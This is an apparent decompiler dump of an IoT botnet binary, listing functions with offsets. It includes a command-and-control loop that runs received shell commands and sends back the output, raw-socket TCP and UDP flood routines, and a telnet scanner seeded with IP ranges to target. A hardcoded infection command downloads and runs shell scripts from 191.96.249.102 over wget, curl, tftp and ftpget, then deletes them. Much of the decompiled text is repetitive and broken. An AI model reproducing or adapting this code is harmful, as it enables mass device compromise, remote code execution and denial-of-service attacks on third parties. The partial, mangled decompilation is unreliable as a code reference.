        szprintf(v244, (int32_t)"43.230.%d.%d", (int32_t)v142);
        szprintf(v245, (int32_t)"43.240.%d.%d", (int32_t)v142);
        szprintf(v246, (int32_t)"43.245.%d.%d", (int32_t)v142);
        szprintf(v247, (int32_t)"41.174.%d.%d", (int32_t)v142);
        szprintf(v248, (int32_t)"49.118.%d.%d", (int32_t)v142);
        szprintf(v249, (int32_t)"78.188.%d.%d", (int32_t)v142);
        szprintf(v250, (int32_t)"45.127.%d.%d", (int32_t)v142);
        szprintf(v251, (int32_t)"103.30.%d.%d", (int32_t)v142);
        szprintf(v252, (int32_t)"14.33.%d.%d", (int32_t)v142);
        szprintf(v253, (int32_t)"123.16.%d.%d", (int32_t)v142);
        szprintf(v254, (int32_t)"202.44.%d.%d", (int32_t)v142);
        szprintf(v255, (int32_t)"116.93.%d.%d", (int32_t)v142);
        szprintf(v256, (int32_t)"91.83.%d.%d", (int32_t)v142);
        szprintf(v257, (int32_t)"41.253.%d.%d", (int32_t)v142);
        szprintf(v258, (int32_t)"117.173.%d.%d", (int32_t)v142);
        szprintf(v259, (int32_t)"113.190.%d.%d", (int32_t)v142);
        szprintf(v260, (int32_t)"146.88.%d.%d", (int32_t)v142);
        szprintf(v261, (int32_t)"112.196.%d.%d", (int32_t)v142);
        szprintf(v262, (int32_t)"113.178.%d.%d", (int32_t)v142);
        szprintf(v263, (int32_t)"112.45.%d.%d", (int32_t)v142);
        szprintf(v264, (int32_t)"183.223.%d.%d", (int32_t)v142);
        szprintf(v265, (int32_t)"116.71.%d.%d", (int32_t)v142);
        szprintf(v266, (int32_t)"103.44.%d.%d", (int32_t)v142);
        szprintf(v267, (int32_t)"110.235.%d.%d", (int32_t)v142);
        szprintf(v268, (int32_t)"124.253.%d.%d", (int32_t)v142);
        szprintf(v269, (int32_t)"211.237.%d.%d", (int32_t)v142);
        szprintf(v270, (int32_t)"117.175.%d.%d", (int32_t)v142);
        szprintf(v271, (int32_t)"117.173.%d.%d", (int32_t)v142);
        szprintf(v272, (int32_t)"178.93.%d.%d", (int32_t)v142);
        szprintf(v273, (int32_t)"111.9.%d.%d", (int32_t)v142);
        szprintf(v274, (int32_t)"222.252.%d.%d", (int32_t)v142);
        szprintf(v275, (int32_t)"113.174.%d.%d", (int32_t)v142);
        szprintf(v276, (int32_t)"222.252.%d.%d", (int32_t)v142);
        szprintf(v277, (int32_t)"113.160.%d.%d", (int32_t)v142);
        szprintf(v278, (int32_t)"113.161.%d.%d", (int32_t)v142);
        szprintf(v279, (int32_t)"113.162.%d.%d", (int32_t)v142);
        szprintf(v280, (int32_t)"113.163.%d.%d", (int32_t)v142);
        szprintf(v281, (int32_t)"113.164.%d.%d", (int32_t)v142);
        szprintf(v282, (int32_t)"113.165.%d.%d", (int32_t)v142);
        szprintf(v283, (int32_t)"113.166.%d.%d", (int32_t)v142);
        szprintf(v284, (int32_t)"113.167.%d.%d", (int32_t)v142);
        szprintf(v285, (int32_t)"113.168.%d.%d", (int32_t)v142);
        szprintf(v286, (int32_t)"113.169.%d.%d", (int32_t)v142);
        szprintf(v287, (int32_t)"123.17.%d.%d", (int32_t)v142);
        szprintf(v288, (int32_t)"123.18.%d.%d", (int32_t)v142);
        szprintf(v289, (int32_t)"123.19.%d.%d", (int32_t)v142);
        szprintf(v290, (int32_t)"123.20.%d.%d", (int32_t)v142);
        szprintf(v291, (int32_t)"123.21.%d.%d", (int32_t)v142);
        szprintf(v292, (int32_t)"123.22.%d.%d", (int32_t)v142);
        szprintf(v293, (int32_t)"222.252.%d.%d", (int32_t)v142);
        szprintf(v294, (int32_t)"222.253.%d.%d", (int32_t)v142);
        szprintf(v295, (int32_t)"222.254.%d.%d", (int32_t)v142);
        szprintf(v296, (int32_t)"222.255.%d.%d", (int32_t)v142);
        szprintf(v297, (int32_t)"37.247.%d.%d", (int32_t)v142);
        szprintf(v298, (int32_t)"41.208.%d.%d", (int32_t)v142);
        szprintf(v299, (int32_t)"183.220.%d.%d", (int32_t)v142);
        szprintf(v300, (int32_t)"175.201.%d.%d", (int32_t)v142);
        szprintf(v301, (int32_t)"103.198.%d.%d", (int32_t)v142);
        szprintf(v302, (int32_t)"183.223.%d.%d", (int32_t)v142);
        szprintf(v303, (int32_t)"50.205.%d.%d", (int32_t)v142);
        szprintf(v304, (int32_t)"88.248.%d.%d", (int32_t)v142);
        szprintf(v305, (int32_t)"88.105.%d.%d", (int32_t)v142);
        szprintf(v306, (int32_t)"88.247.%d.%d", (int32_t)v142);
        szprintf(v307, (int32_t)"85.105.%d.%d", (int32_t)v142);
        szprintf(v308, (int32_t)"188.3.%d.%d", (int32_t)v142);
        szprintf(v309, (int32_t)"103.203.%d.%d", (int32_t)v142);
        szprintf(v310, (int32_t)"103.55.%d.%d", (int32_t)v142);
        szprintf(v311, (int32_t)"103.220.%d.%d", (int32_t)v142);
        szprintf(v312, (int32_t)"183.233.%d.%d", (int32_t)v142);
        szprintf(v313, (int32_t)"103.242.%d.%d", (int32_t)v142);
        szprintf(v314, (int32_t)"103.198.%d.%d", (int32_t)v142);
        szprintf(v315, (int32_t)"103.14.%d.%d", (int32_t)v142);
        szprintf(v316, (int32_t)"103.195.%d.%d", (int32_t)v142);
        szprintf(v317, (int32_t)"103.203.%d.%d", (int32_t)v142);
        szprintf(v318, (int32_t)"103.214.%d.%d", (int32_t)v142);
        szprintf(v319, (int32_t)"103.218.%d.%d", (int32_t)v142);
        szprintf(v320, (int32_t)"103.225.%d.%d", (int32_t)v142);
        szprintf(v321, (int32_t)"103.228.%d.%d", (int32_t)v142);
        szprintf(v322, (int32_t)"103.231.%d.%d", (int32_t)v142);
        szprintf(v323, (int32_t)"103.60.%d.%d", (int32_t)v142);
        szprintf(v324, (int32_t)"103.248.%d.%d", (int32_t)v142);
        szprintf(v325, (int32_t)"103.253.%d.%d", (int32_t)v142);
        szprintf(v326, (int32_t)"103.255.%d.%d", (int32_t)v142);
        szprintf(v327, (int32_t)"103.35.%d.%d", (int32_t)v142);
        szprintf(v328, (int32_t)"103.49.%d.%d", (int32_t)v142);
        szprintf(v329, (int32_t)"103.62.%d.%d", (int32_t)v142);
        szprintf(v330, (int32_t)"144.48.%d.%d", (int32_t)v142);
        szprintf(v331, (int32_t)"163.47.%d.%d", (int32_t)v142);
        szprintf(v332, (int32_t)"163.53.%d.%d", (int32_t)v142);
        szprintf(v333, (int32_t)"223.29.%d.%d", (int32_t)v142);
        szprintf(v334, (int32_t)"59.153.%d.%d", (int32_t)v142);
        szprintf(v335, (int32_t)"113.176.%d.%d", (int32_t)v142);
        szprintf(v336, (int32_t)"113.175.%d.%d", (int32_t)v142);
        szprintf(v337, (int32_t)"113.177.%d.%d", (int32_t)v142);
        szprintf(v338, (int32_t)"113.183.%d.%d", (int32_t)v142);
        szprintf(v339, (int32_t)"202.164.%d.%d", (int32_t)v142);
        szprintf(v340, (int32_t)"203.134.%d.%d", (int32_t)v142);
        szprintf(v341, (int32_t)"210.56.%d.%d", (int32_t)v142);
        szprintf(v342, (int32_t)"49.156.%d.%d", (int32_t)v142);
        szprintf(v343, (int32_t)"203.210.%d.%d", (int32_t)v142);
        szprintf(v344, (int32_t)"117.181.%d.%d", (int32_t)v142);
        szprintf(v345, (int32_t)"117.178.%d.%d", (int32_t)v142);
        szprintf(v346, (int32_t)"117.177.%d.%d", (int32_t)v142);
        szprintf(v347, (int32_t)"117.176.%d.%d", (int32_t)v142);
        szprintf(v348, (int32_t)"117.170.%d.%d", (int32_t)v142);
        szprintf(v349, (int32_t)"117.171.%d.%d", (int32_t)v142);
        szprintf(v350, (int32_t)"117.162.%d.%d", (int32_t)v142);
        szprintf(v350, (int32_t)"112.26.%d.%d", (int32_t)v142);
        szprintf(v351, (int32_t)"112.27.%d.%d", (int32_t)v142);
        szprintf(v352, (int32_t)"112.28.%d.%d", (int32_t)v142);
        szprintf(v353, (int32_t)"112.29.%d.%d", (int32_t)v142);
        szprintf(v354, (int32_t)"112.30.%d.%d", (int32_t)v142);
        szprintf(v355, (int32_t)"112.31.%d.%d", (int32_t)v142);
        szprintf(v356, (int32_t)"203.150.%d.%d", (int32_t)v142);
    return inet_addr(v357);
=================FUNCTION : sysconf ===================
++++++++ FUNCTION START 50272
++++++++ FUNCTION END 51198
++++++++ FUNCTION LENGTH 926
        case 0: {
        case 1: {
        case 2: {
        case 3: {
        case 4: {
            getdtablesize((int32_t)&v144);
        case 5: {
        case 6: {
        case 7: {
        case 8: {
        case 9: {
        case 10: {
        case 11: {
        case 12: {
        case 13: {
        case 14: {
        case 15: {
        case 16: {
        case 17: {
        case 18: {
        case 19: {
        case 20: {
        case 21: {
        case 22: {
        case 23: {
        case 24: {
        case 25: {
        case 26: {
        case 27: {
        case 28: {
        case 29: {
        case 30: {
            __GI_getpagesize();
        case 31: {
        case 32: {
        case 33: {
        case 34: {
        case 35: {
        case 36: {
        case 37: {
        case 38: {
        case 39: {
        case 40: {
        case 41: {
        case 42: {
        case 43: {
        case 44: {
        case 45: {
        case 46: {
        case 47: {
        case 48: {
        case 49: {
        case 50: {
        case 51: {
        case 52: {
        case 53: {
        case 54: {
        case 55: {
        case 56: {
        case 57: {
        case 58: {
        case 59: {
        case 60: {
        case 61: {
        case 62: {
        case 63: {
        case 64: {
        case 65: {
        case 66: {
        case 67: {
        case 68: {
        case 69: {
        case 70: {
        case 71: {
        case 72: {
        case 73: {
        case 74: {
        case 75: {
        case 76: {
        case 77: {
        case 78: {
        case 79: {
        case 80: {
        case 81: {
        case 82: {
        case 83: {
        case 84: {
        case 85: {
        case 86: {
        case 87: {
        case 88: {
        case 89: {
        case 90: {
        case 91: {
        case 92: {
        case 93: {
        case 94: {
        case 95: {
        case 96: {
        case 97: {
        case 98: {
        case 99: {
        case 100: {
        case 101: {
        case 102: {
        case 103: {
        case 104: {
        case 105: {
        case 106: {
        case 107: {
        case 108: {
        case 109: {
        case 110: {
        case 111: {
        case 112: {
        case 113: {
        case 114: {
        case 115: {
        case 116: {
        case 117: {
        case 118: {
        case 119: {
        case 120: {
        case 121: {
        case 122: {
        case 123: {
        case 124: {
        case 125: {
        case 126: {
        case 127: {
        case 128: {
        case 129: {
        case 130: {
        case 131: {
        case 149: {
            if (__GI_clock_getres(1, NULL, 149, 149) >= 0) {
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 62428
++++++++ FUNCTION END 63508
++++++++ FUNCTION LENGTH 1080
                        while (true) {
                                __libc_close(-1);
                                    int32_t v166 = inet_pton(-1, (char *)v158, (int32_t)&v153, (int32_t)&v153); // 0x80569ae
                                        inet_addr(-1);
                                    if (socket(-1, v158, (int32_t)&v153) >= 0) {
                                        if (__libc_connect(-1, v158, (int32_t)&v153) >= 0) {
                                            __libc_send(-1, v158, (int32_t)&v153, (int32_t)&v153);
                                                int32_t v175 = __libc_recv(-1, v158, (int32_t)&v153, (int32_t)&v153); // 0x8056a9e
                                                                            __libc_close(v148);
                                                                        free(v149);
                                                                        free(v149);
                                                                    while (true) {
                                                                                while (true) {
                                                                                            __libc_close(-1);
                                                                                                free(-1);
                                                                                            free(-1);
                                                                                            free(-1);
                                                                                            free(-1);
                                                                                                    free(-1);
                                                                                                            __libc_close(-1);
                                                                                                                free(-1);
                                                                                                            free(-1);
                                                                                                            free(-1);
                                                                                                        __libc_close(-1);
                                                                                                            free(-1);
                                                                                                            free(-1);
                                                                                                        free(-1);
                                                                                                    free(-1);
                                                                                                __libc_close(-1);
                                                                                                    free(-1);
                                                                                                free(-1);
                                                                                                free(-1);
                                                                                __libc_close(-1);
                                                                                    free(-1);
                                                                                    free(-1);
                                                                                    free(-1);
                                                                                free(-1);
                                                                            __libc_close(-1);
                                                                                free(-1);
                                                                                free(-1);
                                                                    __libc_close(v148);
                                                                free(v149);
                                                                free(v149);
                                                                __libc_close(v148);
                                                            free(v149);
                                                            free(v149);
                                    __libc_close(v148);
                                free(v149);
                                free(v149);
                                __libc_close(v148);
                            free(v149);
                            free(v149);
                    __libc_close(v148);
                free(v149);
                free(v149);
                __libc_close(v148);
            free(v149);
            free(v149);
            __libc_close(v148);
        free(v149);
        free(v149);
        __libc_close(v148);
    free(v149);
    free(v149);
=================FUNCTION : main ===================
++++++++ FUNCTION START 25468
++++++++ FUNCTION END 26072
++++++++ FUNCTION LENGTH 604
    if (geteuid() == 0) {
    getBuild();
    int32_t v137 = __GI_inet_ntoa(v136); // 0x805167e
    printf("BUILD %s:%s\n", (char *)getBuild(), (char *)v137);
    sprintf(v142, v134);
    int32_t v144 = v143 ^ __libc_getpid(); // 0x8051733
    srand(v144);
    int32_t v146 = v145 ^ __libc_getpid(); // 0x8051750
    init_rand(v146);
    getOurIP();
    int32_t v148 = __libc_fork((int32_t)v147); // 0x805175f
        if (__libc_fork((int32_t)v147) != 0) {
        while (true) {
            if (initConnection() == 0) {
                getBuild();
                __GI_inet_ntoa(v136);
                HackerPrint((int32_t)v150, (int32_t)&v161);
                while (true) {
                    if (recvLine((int32_t)v150, (char *)&v153, 0x1000) == -1) {
                    while (true) {
                                    v173 = __libc_waitpid(v172, 0, 1);
                                        while (true) {
                                                    while (true) {
                                                                free(v179);
                            if (strstr(v157, "PING") != v157) {
                                int32_t v180 = strstr(v157, "DUP"); // 0x8051ab1
                                HackerPrint((int32_t)v150, (int32_t)"PONG");
                            while (true) {
                                v165 = recvLine((int32_t)v164, (char *)&v153, 0x1000);
                                while (true) {
                        v173 = __libc_waitpid(v172, 0, 1);
                    while (true) {
                                    while (true) {
                                        while (true) {
                                                while (true) {
                                                processCmd(v152, (int32_t *)&v160);
                                            processCmd(v152, (int32_t *)&v160);
                                            if (listFork() == 0) {
                                        while (true) {
                                            v165 = recvLine((int32_t)v164, (char *)&v153, 0x1000);
                                        szprintf(v156, (int32_t)"%s 2>&1", v194);
                                        int32_t v213 = fdpopen(v156, "r"); // 0x8051c81
                                        if (fdgets(v156, 1024, v213) != 0) {
                                            while (fdgets(v156, 1024, v213) != 0) {
                                            fdpclose(v213);
                                        fdpclose(v213);
        __libc_waitpid(v148, (int32_t)&v214, 0);
    while (true) {
        if (initConnection() == 0) {
    free(v216);
        free(v216);
    while (true) {
        if (recvLine((int32_t)v150, (char *)&v153, 0x1000) != -1) {
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 57436
++++++++ FUNCTION END 60977
++++++++ FUNCTION LENGTH 3541
                    while (true) {
                        while (true) {
                                        while (true) {
                                                                                while (true) {
                                                                                                while (true) {
                                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                                    while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                    while (true) {
                                                            while (true) {
                                                                while (true) {
                                                        while (true) {
                                    while (true) {
            while (true) {
                                    while (true) {
        while (true) {
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 4177
++++++++ FUNCTION END 4626
++++++++ FUNCTION LENGTH 449
                    v149 = __vfork(v145);
                        __libc_close(v144);
                        __libc_close(v146);
                            __libc_close(v144);
                            __libc_close(v146);
                            __libc_close(v144);
                        __libc_close(v146);
                            __libc_close(v146);
                        __libc_close(v144);
                v147 = getdtablesize(v145);
                        v149 = __vfork(v145);
                            __libc_close(v144);
                            __libc_close(v146);
                                __libc_close(v144);
                                __libc_close(v146);
                                __libc_close(v144);
                            __libc_close(v146);
                                __libc_close(v146);
                            __libc_close(v144);
                    v149 = __vfork(v145);
                        __libc_close(v144);
                        __libc_close(v146);
                            __libc_close(v144);
                            __libc_close(v146);
                            __libc_close(v144);
                        __libc_close(v146);
                            __libc_close(v146);
                        __libc_close(v144);
                v147 = getdtablesize(v145);
                        v149 = __vfork(v145);
                            __libc_close(v144);
                            __libc_close(v146);
                                __libc_close(v144);
                                __libc_close(v146);
                                __libc_close(v144);
                            __libc_close(v146);
                                __libc_close(v146);
                            __libc_close(v144);
=================FUNCTION : _init ===================
++++++++ FUNCTION START 320
++++++++ FUNCTION END 1098
++++++++ FUNCTION LENGTH 778
        "busybotnet*",
        "wget",
        "busybotnet",
        "/dev/netslink/",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
        "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
        "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)"
        "etrbhhgetrb",
        "http",
        "Unknown host",
        "Host name lookup failure",
    char (*v60)[703] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n";
    __get_pc_thunk_bx(0);
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 39557
++++++++ FUNCTION END 40128
++++++++ FUNCTION LENGTH 571
    int32_t v144 = __get_hosts_byname_r(a1, 2, v141, a4, a5, a6, v143); // 0x8053871
                            if (inet_aton(v164, a3) != 0) {
                            __open_nameservers();
                            v167 = __dns_lookup(v164, 1, v150, (int32_t)&v149, v166, (int32_t)&v153);
                                    free(v153);
                                        free(v151);
                                        free(v151);
                                free(v153);
                                free(v151);
                                if (inet_aton(v164, a3) != 0) {
                                __open_nameservers();
                                v167 = __dns_lookup(v164, 1, v150, (int32_t)&v149, v166, (int32_t)&v153);
                                        free(v153);
                                            free(v151);
                                            free(v151);
                                    free(v153);
                                    free(v151);
        if (inet_aton(v164, a3) != 0) {
        __open_nameservers();
        v167 = __dns_lookup(v164, 1, v150, (int32_t)&v149, v166, (int32_t)&v153);
                free(v153);
                    free(v151);
                    free(v151);
            free(v153);
            free(v151);
        if (inet_aton(v164, a3) != 0) {
        __open_nameservers();
        v167 = __dns_lookup(v164, 1, v150, (int32_t)&v149, v166, (int32_t)&v153);
                free(v153);
                    free(v151);
                    free(v151);
            free(v153);
            free(v151);
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 13613
++++++++ FUNCTION END 14079
++++++++ FUNCTION LENGTH 466
        rand_cmwc(v144);
    int32_t result = getHost(a1, &v146); // 0x804f08c
    int32_t v148 = socket(2, 3, 6); // 0x804f0c4
        result2 = HackerPrint((int32_t)v149, (int32_t)"Failed opening raw socket.");
    if (__GI_setsockopt(v148, 0, 3, (int32_t)&v150, 4) >= 0) {
        *v154 = (int16_t)rand_cmwc(v153);
        int32_t v155 = rand_cmwc(v153); // 0x804f1f0
                while (true) {
                        int32_t v181 = ((int32_t)(v180 | _strncmp(v168, "rst", 4) % 2 == 0) | v175 & -256) ^ 1; // 0x804f309
                                    int32_t v188 = ((int32_t)(v187 | _strncmp(v168, "psh", 4) % 2 == 0) | v175 & -256) ^ 1; // 0x804f3ff
                                        HackerPrint(4, (int32_t)"psh");
                                        v176 = "psh";
                                        v176 = "psh";
                rand_cmwc((int32_t)v172);
                    v162 = rand_cmwc((int32_t)v168);
                *v164 = (int16_t)tcpcsum();
                while (true) {
                    __libc_sendto(v161, v150, v145, v146, v147, 0);
                    *(int16_t *)(v152 | 4) = (int16_t)rand_cmwc(v161);
                    *v156 = rand_cmwc(v161);
                    *v154 = (int16_t)rand_cmwc(v161);
                    *v164 = (int16_t)tcpcsum();
        rand_cmwc((int32_t)v168);
            v162 = rand_cmwc((int32_t)v168);
        *v164 = (int16_t)tcpcsum();
        while (true) {
            __libc_sendto(v161, v150, v145, v146, v147, 0);
            *(int16_t *)(v152 | 4) = (int16_t)rand_cmwc(v161);
            *v156 = rand_cmwc(v161);
            *v154 = (int16_t)rand_cmwc(v161);
            *v164 = (int16_t)tcpcsum();
        result2 = HackerPrint((int32_t)v149, (int32_t)"Failed setting raw headers mode.");
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 11144
++++++++ FUNCTION END 11875
++++++++ FUNCTION LENGTH 731
    int32_t v144 = v143 ^ rand_cmwc(0); // 0x804cffe
    srand(v144);
    while (true) {
                case 0: {
                                    socket(0x10000 * v165 / 0x10000, v166, v164);
                                        if (__libc_connect(v166, v164, 0) == -1) {
                                                sclose(v166);
                    socket(0x10000 * v165 / 0x10000, v166, v164);
                case 1: {
                            sclose(v161);
                            sclose(v176);
                        getsockopt(v161, v177, v175, 10, v171);
                            sclose(v161);
                case 2: {
                case 3: {
                    if (__libc_send(v178, v147, v158, (int32_t)&v162) >= 0) {
                        if (__libc_send(v178, v147, v158, (int32_t)&v162) >= 0) {
                case 4: {
                case 5: {
                    if (__libc_send(v179, v152, v147, v158) >= 0) {
                        if (__libc_send(v179, v152, v147, v158) >= 0) {
                case 6: {
                                    get_telstate_host();
                                    HackerPrint(v150, v152);
                                    get_telstate_host();
                                    HackerPrint(v150, v152);
                case 7: {
                    if (__libc_send(v182, v150, v152, v147) >= 0) {
                        sclose(v182);
        while (true) {
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 42471
++++++++ FUNCTION END 45956
++++++++ FUNCTION LENGTH 3485
                while (true) {
                    while (true) {
                            while (true) {
                                    while (true) {
                                                                                                free(v181);
                                                                                            free(v181);
                                                                                                        free(v181);
                                                                                                    free(v181);
                                                                                                free(v181);
                                                                                                free(v181);
                                                                                            free(v181);
                                                                                free(v181);
                                                                                free(v181);
                                                                            free(v181);
                                                                                        free(v181);
                                                                                        free(v181);
                                                                                    free(v181);
                                                                                free(v181);
                                                                                free(v181);
                                                                            free(v181);
                while (true) {
                while (true) {
            while (true) {
                                                                free(v181);
                                                                free(v181);
                                                            free(v181);
                                                                        free(v181);
                                                                        free(v181);
                                                                    free(v181);
                                                                free(v181);
=================FUNCTION : prints ===================
++++++++ FUNCTION START 2577
++++++++ FUNCTION END 3039
++++++++ FUNCTION LENGTH 462
                    while (true) {
                        printchar(v146, v145);
                        printchar(v146, v145);
                            printchar(v146, v145);
                    printchar(v146, (int32_t)*a2);
                        printchar(v146, (int32_t)*v151);
                    printchar(v146, v145);
                        printchar(v146, v145);
                printchar(v146, v145);
                    printchar(v146, v145);
            printchar(v146, (int32_t)*a2);
                printchar(v146, (int32_t)*v151);
            printchar(v146, v145);
                printchar(v146, v145);
            while (true) {
                printchar(v146, v145);
                printchar(v146, v145);
                    printchar(v146, v145);
            printchar(v146, (int32_t)*a2);
                printchar(v146, (int32_t)*v151);
            printchar(v146, v145);
                printchar(v146, v145);
        printchar(v146, v145);
            printchar(v146, v145);
    printchar(v146, (int32_t)*a2);
        printchar(v146, (int32_t)*v151);
    printchar(v146, v145);
        printchar(v146, v145);
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 71216
++++++++ FUNCTION END 71883
++++++++ FUNCTION LENGTH 667
            while (true) {
                                v158 = __open_etc_hosts();
                                    while (true) {
        while (true) {
            int32_t v169 = __GI_strcasecmp(v164, v168, v167, v167); // 0x8058572
        while (true) {
            if (fgets(v151, v149, v147) != 0) {
                __GI_fclose((int16_t *)v149);
        if (inet_pton(10, (char *)v171, v152, v145) >= 1) {
            __GI_fclose((int16_t *)v149);
        while (true) {
            while (true) {
                if (fgets(v151, v149, v147) != 0) {
                        while (true) {
                                while (true) {
                                            while (true) {
                                while (true) {
                                    int32_t v199 = fgets(v151, v149, v198); // 0x80585d9
                                        v179 = __GI_fclose((int16_t *)v149);
                                    if (inet_pton(2, (char *)v202, (int32_t)v153, v148) >= 1) {
                                while (true) {
                                    __GI_fclose((int16_t *)v149);
                        __GI_fclose((int16_t *)v149);
                            v158 = __open_etc_hosts();
                                while (true) {
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 13091
++++++++ FUNCTION END 13446
++++++++ FUNCTION LENGTH 355
        rand_cmwc(2);
    int32_t result = getHost(a1, &v146); // 0x804eb3c
        int32_t v148 = socket(2, 2, 17); // 0x804eb83
                makeRandomStr(v151, a5);
                while (true) {
                    __libc_sendto(v148, v150, a5, 0, (int32_t)&v145, 16);
                            rand_cmwc((int32_t)v143);
            result3 = HackerPrint((int32_t)v147, (int32_t)"Failed opening raw socket.");
    int32_t v154 = socket(2, 3, 17); // 0x804ec8c
        if (__GI_setsockopt(v154, 0, 3, (int32_t)&v155, 4) < 0) {
            result4 = HackerPrint((int32_t)v147, (int32_t)"Failed setting raw headers mode.");
            int32_t v157 = v156 ^ rand_cmwc((int32_t)v143); // 0x804ed1f
            srand(v157);
            int32_t v158 = random(); // 0x804ed29
            init_rand(v158);
        *v162 = (int16_t)rand_cmwc(v161);
            v163 = rand_cmwc(v161);
        makeRandomStr((char *)v165, v168);
        while (true) {
            __libc_sendto(v172, (int32_t)&v173, (int32_t)&v173, (int32_t)&v173, (int32_t)&v173, (int32_t)&v173);
            *v162 = (int16_t)rand_cmwc(v172);
                v174 = rand_cmwc(v172);
            *(int16_t *)(v160 | 4) = (int16_t)rand_cmwc(v176);
    result4 = HackerPrint((int32_t)v147, (int32_t)"Failed opening raw socket.");
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 34013
++++++++ FUNCTION END 35063
++++++++ FUNCTION LENGTH 1050
        while (true) {
                while (true) {
                    while (true) {
                        while (true) {
                                                while (true) {
                                                    while (true) {
                                                        while (true) {
                                                                        while (true) {
                                                                                while (true) {
                                                                                            while (true) {
                                                                                    while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
    while (true) {
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 63511
++++++++ FUNCTION END 64043
++++++++ FUNCTION LENGTH 532
    int32_t v145 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v144); // 0x8056ee5
        int32_t v158 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v144); // 0x8056f03
        while (true) {
            if (fgets(v156, 128, v148) == 0) {
                __GI_fclose((int16_t *)v146);
        while (true) {
            while (true) {
            while (true) {
                        while (true) {
                            while (true) {
                    while (true) {
                        while (true) {
                            free(v194);
    while (true) {
        if (fgets(v156, 128, v148) != 0) {
        __GI_fclose((int16_t *)v146);
    while (true) {
    while (true) {
        if (fgets(v156, 128, v148) != 0) {
        __GI_fclose((int16_t *)v146);
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 25074
++++++++ FUNCTION END 25316
++++++++ FUNCTION LENGTH 242
    int32_t v144 = socket(2, 2, 0); // 0x80513cc
        inet_addr((int32_t)"8.8.8.8");
        if (__libc_connect(v144, (int32_t)&v145, 16) != -1) {
